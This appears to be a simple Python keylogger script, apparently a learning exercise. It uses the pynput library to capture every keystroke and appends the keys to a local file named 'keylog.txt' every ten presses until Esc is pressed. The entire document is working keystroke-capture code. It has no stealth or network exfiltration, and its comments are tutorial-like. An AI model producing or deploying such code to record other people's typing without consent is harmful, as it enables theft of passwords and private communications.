import pynput
from pynput.keyboard import Key, Listener

#global variables 
counter = 0
keystrokes = []

#when a key is pressed, add one to the counter and add it to the array
def on_press(key):
    global keystrokes
    global counter

    #for formatting, if enter is pressed, will start a new line
    if key == Key.enter:
        keystrokes.append("\n")
    else:
        keystrokes.append(key)

    if counter == 10:
        counter = 0
        log_keystrokes(keystrokes)
        keystrokes = []
    else:
        counter += 1

#if the esc key is pressed, quit the program (break the loop)
def on_release(key):
    
    if key == Key.esc:
        log_keystrokes(keystrokes)
        return False

#write every ten characters to a text file
def log_keystrokes(keystrokes):
    with open("keylog.txt", "a") as file:

        for key in keystrokes:
            file.write(str(key))

#this listener is a loop that will constantly run until it is broken out of
#on_press is a function called when a key is pressed
#on_release is a function called when a key is released
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()